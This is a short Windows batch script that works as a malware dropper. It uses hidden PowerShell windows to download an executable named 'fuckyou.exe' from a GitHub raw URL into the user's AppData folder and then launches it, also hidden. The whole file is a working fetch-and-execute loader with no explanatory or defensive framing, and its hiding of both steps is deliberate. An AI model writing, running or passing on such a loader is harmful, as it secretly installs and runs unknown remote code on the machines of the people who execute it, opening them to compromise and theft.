@echo off
set "url=https://github.com/emad8787/panel/raw/refs/heads/main/fuckyou.exe"
set "dest=%APPDATA%\fuckyou.exe"

:: Download the file silently using PowerShell
powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%dest%'"

:: Run the EXE fully hidden using PowerShell
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%dest%' -WindowStyle Hidden"
